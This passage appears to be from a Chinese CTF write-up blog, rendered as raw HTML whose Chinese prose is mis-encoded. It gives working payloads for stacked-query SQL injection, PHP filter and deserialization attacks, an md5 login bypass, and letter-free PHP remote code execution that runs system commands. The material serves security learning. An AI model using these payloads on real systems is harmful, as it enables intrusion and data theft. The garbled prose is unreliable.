PIPES_AS_CONCAT æ—¶ï¼Œ|| æ˜¯å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œç›¸å½“äº concat () å‡½æ•°</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , è¿™æ ·æŸ¥è¯¢å‡ºäº† Flag è¡¨çš„æ‰€æœ‰å†…å®¹<br>\næ­¤å¤„çš„ 1 æ˜¯ä¸´æ—¶å¢åŠ ä¸€åˆ—ï¼Œåˆ—åä¸º 1||flag ä¸”è¿™ä¸€åˆ—çš„æ‰€æœ‰å€¼éƒ½ä¸º 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>è¿”å›ä¸€ä¸ªåˆ—åä¸º 1||flag, åˆ—å…ƒç´ ä¸º 1flag çš„å€¼çš„è¡¨</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€æ­¥ï¼šç»•è¿‡ file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost ä¼ å‚: <code>welcomeÂ toÂ theÂ zjctf</code> <br>\n (2) data åè®®<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n æ ¹æ®æç¤ºçš„ useless.php å¯ä»¥å‘ç°å¯ä»¥ç”¨ä¼ªåè®®è¯»å–<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n ç¬¬ä¸€æ­¥:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">postä¼ å‚:welcomeÂ toÂ theÂ zjct</span><br></pre></td></tr></table></figure>\n<p>ç»è¿‡ base64 è§£ç å¾—åˆ° useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„ tostring é­”æœ¯æ–¹æ³•åœ¨å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†æ—¶ä¼šè°ƒç”¨ï¼Œindex é‡Œå°±æ˜¯ echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n æœ€ç»ˆ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">postä¼ å‚:welcomeÂ toÂ theÂ zjct</span><br></pre></td></tr></table></figure>\n<p>æ£€æŸ¥å¯å‘ç°æºä»£ç æ³¨é‡Šéƒ¨åˆ†æœ‰ flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; ç½‘ç»œ -&gt; è¯·æ±‚å¤´ -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„:<br>\n <code>\\å’Œåé¢ä¸‰ä¸ªå­—ç¬¦ç®—ä¸€ä¸ªå­—ç¬¦</code> <br>\n sql:``select * from admin where username=â€˜adminâ€™ and password=â€™&quot;â€˜orâ€™6]!r,b&quot;â€™;</p>\n<p>åœ¨ mysql é‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥ 1 å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚ password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº password=â€˜xxxâ€™ or 1  ï¼Œä¹Ÿå°±ç›¸å½“äº password=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯ true</p>\n<p>å…³é”®æ˜¯:<mark>â€™ or 1â€™</mark><br>\nç­”æ¡ˆè‚¯å®šä¸æ­¢ä¸€ä¸ª</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>å¤ç°:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>ç„¶åå°±æ˜¯å¸¸è§„çš„æ•°ç»„ç»•è¿‡ï¼Œ0e ç»•è¿‡äº†</p>\n<h3 id=\"8swpuctf-2021-æ–°ç”Ÿèµ›hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-æ–°ç”Ÿèµ›hardrce\">#</a> 8.[SWPUCTF 2021 æ–°ç”Ÿèµ›] hardrce</h3>\n<h4 id=\"æ— å­—æ¯rce\"><a class=\"markdownIt-Anchor\" href=\"#æ— å­—æ¯rce\">#</a> æ— å­—æ¯ rce</h4>\n<ol>\n<li>system () å‡½æ•°</li>\n</ol>\n<ul>\n<li>æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶æ˜¾ç¤ºè¾“å‡ºèµ„æ–™</li>\n</ul>\n<ol start=\"2\">\n<li>eval () å‡½æ•°</li>\n</ol>\n<ul>\n<li>æŠŠå­—ç¬¦ä¸²å½“ php ä»£ç æ‰§è¡Œï¼Œå¿…é¡»ä»¥ï¼›ç»“å°¾</li>\n</ul>\n<ol start=\"3\">\n<li>php çš„å–åé—®é¢˜ï½<br>\n æ­¤é¢˜è¿‡æ»¤äº†å¾ˆå¤šé»‘åå•ï¼Œæ ¹æ®é¢˜ç›®æç¤ºæ˜¯æ— å­—æ¯ rce æƒ³åˆ°äº†ï½</li>\n</ol>\n<ul>\n<li>å¯¹äºæ•°å­—å–åçš„è§„åˆ™å¯ä»¥çœ‹çœ‹è¿™ç¯‡:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>å¯¹äºå­—ç¬¦å–åï¼Œç”±äºæœ‰å¤§é‡çš„ä¸å¯æ˜¾å­—ç¬¦ï¼Œè¦ url ç¼–ç </li>\n<li>æ–¹æ³•ä¸€:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>é…åˆ eval å‡½æ•°å¯ä»¥ç›´æ¥æŠŠ phpinfo (); å½“ php ä»£ç æ‰§è¡Œ<br>\n eg2.<br>\n è¦æ„é€  <code>assert($_POST[1])</code>  è¯­å¥ï¼Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">å¾—åˆ°</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(å†™åœ¨ä¸€è¡Œ):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>å¸¸è§å–å url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n å¯è‡ªè¡Œè¿è¡Œå¾—:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>æ–¹æ³•äºŒ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;å¢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;å¢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// è¾“å‡ºrr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;æ˜¯\\x8d,\\x8då–åæ˜¯r</code></p>\n<p>æ­¤é¢˜ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>æ·±åˆ»å­¦ä¹ æ— å­—æ¯ rce æ¥è¿™é‡Œ</strong></p>\n<h3 id=\"9pop\"><a class=\"markdownIt-Anchor\" href=\"#9pop\">#</a> 9.pop</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;aaa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span> = <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Getflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;admin === <span class=\"string\">&#x27;w44m&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;passwd === <span class=\"string\">&#x27;08067&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;admin;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;passwd;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nono&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;w00m;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;w00m-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;w22m&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$w00m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;w00m&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$w00m</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å…¥å£:w22m.destruct, è®© w22m çš„ $woom ä¸º w33m å¯¹è±¡ï¼Œè°ƒç”¨ w33m çš„ toString æ–¹æ³•ï¼Œè®© w33m çš„ <code>w00m</code>  ä¸º w44m å¯¹è±¡ï¼Œw22m ä¸ºå­—ç¬¦ä¸²â€™Getflag ()â€™, å°±èƒ½è°ƒç”¨ w44m çš„ Getflag () æ–¹æ³•<br>\næ„é€ è„šæœ¬:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$admin</span>=<span class=\"string\">&#x27;w44m&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span>=<span class=\"string\">&#x27;08067&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w22m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w33m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w44m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w22m=<span class=\"string\">&#x27;Getflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>payload1:(åŠ  %00)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>payload2:(ç›´æ¥ç”¨ url ç¼–ç åçš„)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 